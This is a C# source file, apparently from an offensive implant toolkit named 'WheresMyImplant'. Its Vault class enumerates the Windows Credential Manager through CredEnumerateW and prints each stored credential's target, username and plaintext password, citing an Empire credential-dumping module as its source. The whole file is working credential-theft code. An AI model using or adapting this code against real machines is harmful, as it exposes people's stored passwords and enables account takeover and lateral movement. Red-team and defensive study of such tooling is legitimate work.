using System;
using System.Runtime.InteropServices;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace WheresMyImplant
{
    class Vault : Base
    {
        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Vault() : base()
        {
        }

        ////////////////////////////////////////////////////////////////////////////////
        // 
        ////////////////////////////////////////////////////////////////////////////////
        internal void EnumerateCredentials()
        {
            Int32 count = 0;
            IntPtr hCredential;
            if (!advapi32.CredEnumerateW(null, 0, out count, out hCredential))
            {
                WriteOutputBad(String.Format("CredEnumerateW Failed, Read {0}", count));
                return;
            }

            try
            {
                ReadCredentials(hCredential, count);
            }
            catch (Exception error)
            {
                WriteOutputBad(error.ToString());
            }
            finally
            {
                advapi32.CredFree(hCredential);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // 
        ////////////////////////////////////////////////////////////////////////////////
        private void ReadCredentials(IntPtr hCredential, Int32 count)
        {
            WinCred._CREDENTIAL[] credentialObject = new WinCred._CREDENTIAL[count];
            for (Int32 i = 0; i < count; i++)
            {
                IntPtr hTemp = Marshal.ReadIntPtr(hCredential, i * IntPtr.Size);
                try
                {

                    WinCred._CREDENTIAL credential = (WinCred._CREDENTIAL)Marshal.PtrToStructure(hTemp, typeof(WinCred._CREDENTIAL));
                    WriteOutput(String.Format("{0,-20} {1,-20}", "Flags", credential.Flags));
                    WriteOutput(String.Format("{0,-20} {1,-20}", "Type", credential.Type));
                    WriteOutput(String.Format("{0,-20} {1,-20}", "TargetName", PrintIntPtr(credential.TargetName)));
                    WriteOutput(String.Format("{0,-20} {1,-20}", "Comment", PrintIntPtr(credential.Comment)));

                    //https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1
                    Int64 lastWritten = credential.LastWritten.dwHighDateTime;
                    lastWritten = (lastWritten << 32) + credential.LastWritten.dwLowDateTime;
                    WriteOutput(String.Format("{0,-20} {1,-20}", "LastWritten", DateTime.FromFileTime(lastWritten)));

                    WriteOutput(String.Format("{0,-20} {1,-20}", "Password Size", credential.CredentialBlobSize));
                    String credentialBlob;
                    if (0 < credential.CredentialBlobSize)
                    {
                        credentialBlob = Marshal.PtrToStringUni(credential.CredentialBlob, (Int32)credential.CredentialBlobSize / 2);
                    }
                    else
                    {
                        credentialBlob = PrintIntPtr(credential.CredentialBlob);
                    }

                    WriteOutput(String.Format("{0,-20} {1,-20}", "Password", credentialBlob));
                    WriteOutput(String.Format("{0,-20} {1,-20}", "Persist", credential.Persist));
                    WriteOutput(String.Format("{0,-20} {1,-20}", "AttributeCount", credential.AttributeCount));
                    WriteOutput(String.Format("{0,-20} {1,-20}", "Attributes", credential.Attributes));
                    WriteOutput(String.Format("{0,-20} {1,-20}", "TargetAlias", PrintIntPtr(credential.TargetAlias)));
                    WriteOutput(String.Format("{0,-20} {1,-20}", "UserName", PrintIntPtr(credential.UserName)));
                    WriteOutput(String.Format(""));
                }
                catch (Exception error)
                {
                    WriteOutputBad(error.ToString());
                }
                finally
                {
                    kernel32.CloseHandle(hTemp);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static String PrintIntPtr(IntPtr input)
        {
            String output = String.Empty;
            if (IntPtr.Zero == input)
            {
                return output;
            }

            try
            {
                output = Marshal.PtrToStringUni(input);
            }
            catch (AccessViolationException error)
            {
                output = error.ToString();
            }
            return output;
        }
    }
}